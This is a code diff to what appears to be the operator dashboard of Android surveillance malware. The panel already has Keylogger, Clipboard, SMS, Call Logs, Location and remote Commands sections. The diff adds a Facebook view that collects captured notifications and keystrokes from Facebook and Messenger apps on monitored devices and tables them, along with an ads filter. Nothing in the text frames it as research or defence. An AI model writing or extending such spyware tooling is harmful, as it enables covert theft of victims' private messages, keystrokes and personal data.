@@ -160,6 +160,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
       <div class="nav-item" data-section="sms"><svg><use href="/static/icons.svg#icon-sms"/></svg> SMS</div>
       <div class="nav-item" data-section="notifications"><svg><use href="/static/icons.svg#icon-bell"/></svg> Notifications <span class="badge" id="notifBadge">{{ total_notif }}</span></div>
       <div class="nav-item" data-section="chats"><svg><use href="/static/icons.svg#icon-chat"/></svg> Chats</div>
+      <div class="nav-item" data-section="facebook"><svg><use href="/static/icons.svg#icon-globe"/></svg> Facebook</div>
       <div class="nav-item" data-section="contacts"><svg><use href="/static/icons.svg#icon-contacts"/></svg> Contacts</div>
       <div class="nav-item" data-section="apps"><svg><use href="/static/icons.svg#icon-apps"/></svg> App Usage</div>
       <div class="nav-item" data-section="devices"><svg><use href="/static/icons.svg#icon-devices"/></svg> Devices <span class="badge" id="devBadge">{{ total_devices }}</span></div>
@@ -256,6 +257,21 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
         <div class="card"><div class="card-header">Percakapan</div><div class="card-body" id="chatData"></div></div>
       </div>
 
+      <!-- ======== FACEBOOK ======== -->
+      <div class="section" id="sec-facebook">
+        <div class="stats-row" id="fbStats"></div>
+        <div class="filter-bar">
+          <select id="fbFilter" style="background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:6px 10px;color:var(--text);font-size:12px" onchange="loadFacebook()">
+            <option value="all">Semua</option>
+            <option value="messenger">Messenger</option>
+            <option value="facebook">Facebook App</option>
+            <option value="ads">Iklan/Sponsored</option>
+          </select>
+          <div class="filter-chip active" onclick="loadFacebook()">Refresh</div>
+        </div>
+        <div class="card"><div class="card-header"><svg><use href="/static/icons.svg#icon-globe"/></svg> Facebook Activity</div><div class="card-body" id="fbData"></div></div>
+      </div>
+
       <!-- ======== CONTACTS ======== -->
       <div class="section" id="sec-contacts">
         <div class="filter-bar">
@@ -319,7 +335,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 
 <script>
 const BASE_URL = '{{ base_url }}';
-const SECTION_NAMES = {overview:'Overview',location:'Location',keylog:'Keylogger',clipboard:'Clipboard',calls:'Call Logs',sms:'SMS',notifications:'Notifications',chats:'Chats',contacts:'Contacts',apps:'App Usage',devices:'Devices',commands:'Commands',settings:'Settings'};
+const SECTION_NAMES = {overview:'Overview',location:'Location',keylog:'Keylogger',clipboard:'Clipboard',calls:'Call Logs',sms:'SMS',notifications:'Notifications',chats:'Chats',facebook:'Facebook',contacts:'Contacts',apps:'App Usage',devices:'Devices',commands:'Commands',settings:'Settings'};
 
 function switchSection(name){
   document.querySelectorAll('.nav-item').forEach(e=>e.classList.remove('active'));
@@ -338,6 +354,7 @@ function switchSection(name){
   else if(name=='sms') loadSms();
   else if(name=='notifications') loadNotifs();
   else if(name=='chats') loadChats();
+  else if(name=='facebook') loadFacebook();
   else if(name=='contacts') loadContacts();
   else if(name=='apps') loadApps();
   else if(name=='devices') loadDevices();
@@ -514,6 +531,71 @@ async function loadChats(){
   });
   
   document.getElementById('chatData').innerHTML=html||'<div class="empty-state">No chat messages</div>';
+}
+
+// Facebook
+async function loadFacebook(){
+  let d=await api('/admin/dashboard/json');
+  if(!d) return;
+  let filter=document.getElementById('fbFilter').value;
+  
+  // FB packages
+  let fbPkgs = ['com.facebook.orca','com.facebook.katana','com.facebook.lite',
+    'com.facebook.mlite','com.facebook.adsmanager','com.facebook'];
+  
+  // Collect FB items
+  let items=[];
+  let fbNotifs=0, fbKeylogs=0, fbClips=0;
+  
+  // From notifications
+  (d.notifs||[]).forEach(n=>{
+    let app=(n.app||'').toLowerCase();
+    if(fbPkgs.some(p=>app.includes(p))){
+      items.push({type:'notifikasi',app:'Messenger'||n.app,msg:n.message||'',ts:n.timestamp||''});
+      fbNotifs++;
+    }
+  });
+  
+  // From keylogs
+  (d.keylogs||[]).forEach(k=>{
+    let pkg=(k.package||'').toLowerCase();
+    if(fbPkgs.some(p=>pkg.includes(p))){
+      items.push({type:'ketikan',app:pkg.split('.').pop()||'facebook',msg:k.text||'',ts:k.received_at||''});
+      fbKeylogs++;
+    }
+  });
+  
+  // Stats
+  document.getElementById('fbStats').innerHTML=
+    `<div class="stat-card"><div class="icon"><svg><use href="/static/icons.svg#icon-bell"/></svg></div><div class="num">${fbNotifs}</div><div class="label">Notifikasi</div></div>
+    <div class="stat-card"><div class="icon"><svg><use href="/static/icons.svg#icon-keylog"/></svg></div><div class="num">${fbKeylogs}</div><div class="label">Aktivitas</div></div>
+    <div class="stat-card"><div class="icon"><svg><use href="/static/icons.svg#icon-globe"/></svg></div><div class="num">${items.length}</div><div class="label">Total Events</div></div>`;
+  
+  // Sort by time
+  items.sort((a,b)=>a.ts.localeCompare(b.ts));
+  
+  // Render
+  if(!items.length) return void(document.getElementById('fbData').innerHTML='<div class="empty-state">Belum ada data Facebook</div>');
+  
+  let html='<table><tr><th>Waktu</th><th>App</th><th>Tipe</th><th>Konten</th></tr>';
+  items.slice(-50).reverse().forEach(i=>{
+    html+=`<tr><td>${(i.ts||'').slice(11,19)}</td><td>${i.app}</td><td style="color:var(--blue)">${i.type}</td><td style="max-width:300px;overflow:hidden;text-overflow:ellipsis">${esc(i.msg.slice(0,100))}</td></tr>`;
+  });
+  html+='</table>';
+  
+  // Ads section
+  html+=`<div style="margin-top:16px"><div class="card-header">Iklan & Sponsored</div><div class="card-body">`;
+  let ads=items.filter(i=>i.msg.toLowerCase().includes('sponsored')||i.msg.toLowerCase().includes('ads')||i.msg.toLowerCase().includes('iklan'));
+  if(ads.length){
+    ads.slice(-20).reverse().forEach(i=>{
+      html+=`<div class="kl-entry"><div class="kl-meta">${i.ts||''} | ${i.app}</div><div class="kl-text">${esc(i.msg)}</div></div>`;
+    });
+  } else {
+    html+=`<div class="empty-state">Belum terdeteksi iklan Facebook</div>`;
+  }
+  html+=`</div></div>`;
+  
+  document.getElementById('fbData').innerHTML=html;
 }
 
 // Contacts
